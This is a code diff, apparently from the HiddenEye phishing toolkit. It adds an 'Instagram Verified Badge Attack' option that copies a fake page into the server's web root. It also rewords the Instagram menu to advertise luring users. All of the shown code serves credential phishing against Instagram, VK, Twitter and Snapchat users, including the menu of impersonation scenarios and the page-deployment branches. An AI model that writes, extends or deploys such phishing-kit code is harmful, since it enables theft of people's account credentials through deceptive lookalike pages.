@@ -69,7 +69,9 @@ def runPhishing(page , customOption): #Phishing pages selection menu
     elif customOption == '2' and page == 'Instagram':
         copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
     elif customOption == '3' and page == 'Instagram':
-        copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")    
+        copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")
+    elif customOption == '4' and page == 'Instagram':
+        copy_tree("WebPages/Instagram_VerifiedBadge/", "Server/www/")  	
     elif customOption == '1' and page == 'VK':
         copy_tree("WebPages/VK/", "Server/www/")
     elif customOption == '2' and page == 'VK':
@@ -217,7 +219,7 @@ def runMainMenu(): #menu where user select what they wanna use
         runPhishing('Twitter', customOption)
     elif option == '8':
         loadModule('Instagram')
-        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
         runPhishing('Instagram', customOption)
     elif option == '9':
         loadModule('Snapchat')
